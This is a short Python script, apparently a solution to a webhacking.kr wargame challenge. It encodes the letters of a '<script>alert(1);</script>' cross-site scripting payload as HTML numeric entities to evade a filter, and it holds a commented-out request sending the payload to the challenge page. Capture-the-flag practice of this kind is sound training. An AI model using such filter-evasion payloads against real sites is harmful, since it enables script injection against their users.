
import requests
import string
url = "https://webhacking.kr/challenge/bonus-3/index.php"
print("webhacking"*30)
crack_no_encoded = "<script>alert(1);</script>"
crack_encoded =""
for c in crack_no_encoded:
    if c in string.ascii_letters:
        crack_encoded += "&#" + str(ord(c)) + ";" 
    else:
        crack_encoded += c
print(crack_encoded)

# response = requests.get(url+"?code="+crack_encoded )                                

# print(response.text)

    